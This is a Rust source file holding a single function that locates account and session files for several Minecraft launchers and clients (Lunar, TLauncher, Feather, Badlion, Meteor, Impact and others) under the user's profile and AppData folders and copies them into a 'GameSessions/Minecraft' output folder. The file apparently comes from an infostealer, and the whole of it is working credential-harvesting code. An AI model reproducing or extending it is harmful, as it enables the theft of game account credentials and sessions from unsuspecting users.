use std::path::{Path, PathBuf};
use std::fs;

pub fn extract(output_dir: &Path) -> usize {
    let mut count = 0;
    
    let user_profile = std::env::var("USERPROFILE").unwrap_or_default();
    let app_data = std::env::var("APPDATA").unwrap_or_default();

    if user_profile.is_empty() || app_data.is_empty() {
        return 0;
    }

    let user_profile_path = PathBuf::from(user_profile);
    let app_data_path = PathBuf::from(app_data);

    let targets = [
        ("Intent", user_profile_path.join("intentlauncher\\launcherconfig")),
        ("Lunar", user_profile_path.join(".lunarclient\\settings\\game\\accounts.json")),
        ("TLauncher", app_data_path.join(".minecraft\\TlauncherProfiles.json")),
        ("Feather", app_data_path.join(".feather\\accounts.json")),
        ("Meteor", app_data_path.join(".minecraft\\meteor-client\\accounts.nbt")),
        ("Impact", app_data_path.join(".minecraft\\Impact\\alts.json")),
        ("Badlion", app_data_path.join("Badlion Client\\accounts.json")),
    ];

    let dest_dir = output_dir.join("GameSessions").join("Minecraft");
    let mut created_dir = false;

    for (_name, path) in targets.iter() {
        if path.exists() {
            if !created_dir {
                fs::create_dir_all(&dest_dir).ok();
                created_dir = true;
            }

            if let Some(fname) = path.file_name() {
                if let Ok(_) = fs::copy(path, dest_dir.join(fname)) {
                    count += 1;
                }
            }
        }
    }

    count
}
